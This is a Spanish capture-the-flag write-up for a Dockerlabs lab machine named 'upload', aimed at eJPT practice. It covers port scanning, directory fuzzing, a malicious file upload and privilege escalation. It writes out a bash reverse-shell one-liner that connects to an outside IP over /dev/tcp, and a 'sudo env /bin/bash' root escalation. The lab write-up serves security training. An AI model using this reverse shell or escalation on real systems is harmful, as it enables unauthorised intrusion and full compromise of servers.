Máquina upload

Iniciamos como siempre con la rutina de reconocimiento de nmap:

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oN Target
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 18:13 CEST
Initiating ARP Ping Scan at 18:13
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:13, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:13
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:13, 0.78s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000050s latency).
Scanned at 2024-04-18 18:13:57 CEST for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

```
nmap -p80 -sCV --min-rate 5000 172.17.0.2 -oN TargetsCV   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 18:14 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Upload here your file
```

Bueno en nmap no vemos casi nada raro simplemente un página web, vamos a verla

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/5933723f-eead-4ce9-bb5c-77e7b3ff5449)

Bueno teniendo en cuenta que es una máquina facil, pues viendo esta captura ya podemos pensar en una subida de arhivos maliciosa,
para complicarlo un pelin, no vamos a utilizar el script básico de monkey, crearemos nosotros mismos el archivo malicioso, pero antes
de hacer nada hay que saber donde esta la ruta donde podemos ejecutar el archivo una vez subido, para eso vamos a fuzzear un poquito:

```
gobuster dir -u "http://172.17.0.2" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/server-status        (Status: 403) [Size: 275]
Progress: 116848 / 207644 (56.27%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 121522 / 207644 (58.52%)
===============================================================
Finished
===============================================================
```

Pues bueno ya estaría, supongo que se guardara también con el nombre que le pongamos así que vamos a crear el archivo malicioso:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/4dbeffcd-4e1f-4e85-a8c4-bcace653ff2e)

Bueno ya tenemos ejecución remota de comandos, ahora la reverse shell:

```
bash -c "bash -i >%26 /dev/tcp/192.168.1.37/443 0>%261" # nc -nlvp 443
```

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/1a06caeb-5703-4164-9a08-da5d8fb84b99)

Una vez entablada la reverse shell hacemos tratamiento de la tty:

```
script /dev/null -c bash
{ctrl+z}
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Bueno para la escalada de privilegios empezamos por sudo -l en el cual ya nos encontramos con algo:

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/6e3c4c9f-8bdf-4904-abf9-6d66c2cba6be)

Esto lo que esta haciendo es que podemos ejecutar el comando env con privilegios, esto se explota de la siguiente manera:

```
sudo env /bin/bash
```

![image](https://github.com/FakeLuci/Dockerlabs-Writeps/assets/96147300/bdb7e0b1-cad5-496f-82ee-3f15e00d9cdf)

Teniendo en cuenta que estas máquinas van relacionadas para entrenar para el certificado eJPT esta bien ya que podemos entrenar la subida de archivos,
lo cual es esencial en el hacking ademas de poder crear el nuestro y una escalada facil pero efectiva en los estudios para la eJPT.

Dificultad 1/5
Diversión 4/5
